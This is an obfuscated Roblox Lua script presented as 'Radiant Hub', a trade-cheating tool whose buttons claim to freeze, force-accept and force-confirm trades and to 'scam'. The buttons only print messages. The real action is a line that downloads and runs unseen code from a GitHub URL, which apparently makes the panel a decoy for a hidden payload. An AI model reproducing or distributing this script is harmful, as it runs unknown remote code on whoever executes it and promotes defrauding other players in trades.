local _0xD1, _0xD2, _0xD3, _0xD4, _0xD5, _0xD6, _0xD7 = game, game:GetService("CoreGui"), Instance.new, Instance.new, Color3.fromRGB, Enum.Font.GothamBold, Enum.Font.GothamSemibold
if _0xD2:FindFirstChild("RadiantHub") then _0xD2.RadiantHub:Destroy() end
local _0xD8 = _0xD3("ScreenGui") 
_0xD8.Name, _0xD8.ResetOnSpawn, _0xD8.Parent = "RadiantHub", false, _0xD2
local _0xD9 = _0xD3("Frame")
_0xD9.Size, _0xD9.Position, _0xD9.BackgroundColor3, _0xD9.BorderColor3, _0xD9.BorderSizePixel, _0xD9.Active, _0xD9.Draggable, _0xD9.Parent = UDim2.new(0, 320, 0, 230), UDim2.new(0.5, -160, 0.5, -115), _0xD5(20, 20, 20), _0xD5(255, 215, 0), 2, true, true, _0xD8
local _0xDA = _0xD3("TextLabel")
_0xDA.Size, _0xDA.BackgroundColor3, _0xDA.BorderSizePixel, _0xDA.Text, _0xDA.TextColor3, _0xDA.Font, _0xDA.TextSize, _0xDA.Parent = UDim2.new(1, 0, 0, 40), _0xD5(30, 30, 30), 0, "☣ RADIANT HUB v2.0 ☣", _0xD5(255, 215, 0), _0xD6, 20, _0xD9
local _0xDB = _0xD3("Frame")
_0xDB.Size, _0xDB.Position, _0xDB.BackgroundColor3, _0xDB.BorderSizePixel, _0xDB.Parent = UDim2.new(1, -20, 0, 1), UDim2.new(0, 10, 0, 42), _0xD5(255, 215, 0), 0, _0xD9
local function _0xDC(_0xDD, _0xDE)
    local _0xDF = _0xD3("TextButton")
    _0xDF.Size, _0xDF.Position, _0xDF.BackgroundColor3, _0xDF.BorderColor3, _0xDF.BorderSizePixel, _0xDF.Text, _0xDF.TextColor3, _0xDF.Font, _0xDF.TextSize, _0xDF.AutoButtonColor, _0xDF.Parent = UDim2.new(1, -40, 0, 40), UDim2.new(0, 20, 0, 50 + (_0xDE * 50)), _0xD5(40, 40, 40), _0xD5(255, 215, 0), 1, _0xDD, _0xD5(255, 215, 0), _0xD6, 16, false, _0xD9
    _0xDF.MouseEnter:Connect(function() _0xDF.BackgroundColor3 = _0xD5(60, 60, 60) end)
    _0xDF.MouseLeave:Connect(function() _0xDF.BackgroundColor3 = _0xD5(40, 40, 40) end)
    return _0xDF
end
local _0xE0 = _0xDC("🧊 Freeze Trade", 0)
local _0xE1 = _0xDC("✅ Force Accept", 1)
local _0xE2 = _0xDC("⚠️ Force Confirm", 2)
local _0xE3 = _0xDC("🚨 Auto Only Scam Secrets", 3)
_0xE0.MouseButton1Click:Connect(function() print("[RADIANT HUB] Freeze Trade executed") end)
_0xE1.MouseButton1Click:Connect(function() print("[RADIANT HUB] Force Accept executed") end)
_0xE2.MouseButton1Click:Connect(function() print("[RADIANT HUB] Force Confirm executed") end)
_0xE3.MouseButton1Click:Connect(function() print("[RADIANT HUB] Auto Only Scam Secrets executed") end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/DARKHUBB/RADIANTHUBv2.0/refs/heads/main/RADIANTHUBv2.0.lua"))()
local _0xE4 = _0xD1:GetService("UserInputService")
local _0xE5 = true
_0xE4.InputBegan:Connect(function(_0xE6)
    if _0xE6.KeyCode == Enum.KeyCode.RightShift then
        _0xE5 = not _0xE5
        _0xD8.Enabled = _0xE5
    end
end)
